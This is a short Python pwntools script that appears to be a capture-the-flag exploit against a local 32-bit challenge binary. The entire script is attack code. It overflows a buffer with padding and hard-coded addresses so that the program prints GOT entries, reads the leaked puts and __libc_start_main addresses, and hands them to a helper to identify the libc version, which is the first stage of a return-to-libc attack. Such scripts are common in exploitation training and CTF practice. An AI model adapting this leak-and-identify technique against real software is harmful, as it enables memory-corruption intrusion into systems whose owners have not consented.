from pwn import *

import TheNight

import sys

target = process("./chall-test_localLibcId-encrpyt19-pwn0")
payload = ""
payload += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
payload += p32(0x8048390)
payload += p32(0x8048390)
payload += p32(0x8049870)
payload += p32(0x804987c)
target.sendline(payload)
target.recvline()
target.recvline()
target.recvline()
leak = target.recv(4)
gotAddress0 = u32(leak)
target.recvline()
leak = target.recv(4)
gotAddress1 = u32(leak)
symbol0 = "puts"
symbol1 = "__libc_start_main"
TheNight.findLibcVersionAutomated("puts", gotAddress0, "__libc_start_main", gotAddress1)
